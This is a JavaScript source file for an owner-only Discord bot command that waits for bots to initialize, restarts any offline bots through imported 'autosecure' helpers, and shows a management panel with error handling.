const { EmbedBuilder } = require("discord.js");
const { initializationStatus } = require("../../../autosecure");
const createbotmsg = require("../../../autosecure/utils/bot/createbotmsg");
const { restartbots } = require("../../../autosecure/utils/bot/restartbots");
const { checkofflinebots } = require("../../../autosecure/utils/process/helpers");

const EMBED_COLOR = 0x40e0d0;
const INIT_TIMEOUT = 30_000;
const INIT_CHECK_INTERVAL = 500;

/**
 * Wait until bots are initialized or timeout
 */
async function waitForInitialization() {
    if (initializationStatus.get("botsInitialized")) return true;

    const start = Date.now();
    while (Date.now() - start < INIT_TIMEOUT) {
        await new Promise(res => setTimeout(res, INIT_CHECK_INTERVAL));
        if (initializationStatus.get("botsInitialized")) return true;
    }
    return false;
}

module.exports = {
    name: "bots",
    botowneronly: true,
    description: "Manage your bots",

    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });

            // ⏳ Wait for initialization
            const initialized = await waitForInitialization();
            if (!initialized) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setColor(EMBED_COLOR)
                            .setDescription(
                                "⚠️ **Bot initialization is taking too long.**\nPlease report this to the developers."
                            )
                    ]
                });
            }

            const userId = interaction.user.id;

            // 🔍 Check offline bots
            const offlineBots = await checkofflinebots(userId);

            if (offlineBots?.length) {
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setColor(EMBED_COLOR)
                            .setTitle("🔄 Restarting Offline Bots")
                            .setDescription(
                                `Detected **${offlineBots.length}** offline bot(s). Attempting restart...`
                            )
                    ]
                });

                const restartMessage = await restartbots(userId, offlineBots);

                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setColor(EMBED_COLOR)
                            .setTitle("✅ Restart Attempt Finished")
                            .setDescription(restartMessage || "Restart process completed.")
                    ]
                });

                const botMessage = await createbotmsg(client, userId);
                return interaction.followUp({ ...botMessage, ephemeral: true });
            }

            // 📊 All bots online → show management panel
            const botMessage = await createbotmsg(client, userId);
            await interaction.editReply(botMessage);

        } catch (error) {
            console.error("[BOTS COMMAND ERROR]", error);

            const errorMessage = {
                content: "❌ **An unexpected error occurred while managing your bots.**",
                embeds: []
            };

            try {
                if (interaction.deferred || interaction.replied) {
                    await interaction.editReply(errorMessage);
                } else {
                    await interaction.reply({ ...errorMessage, ephemeral: true });
                }
            } catch (sendError) {
                console.error("Failed to send error response:", sendError);
            }
        }
    }
};
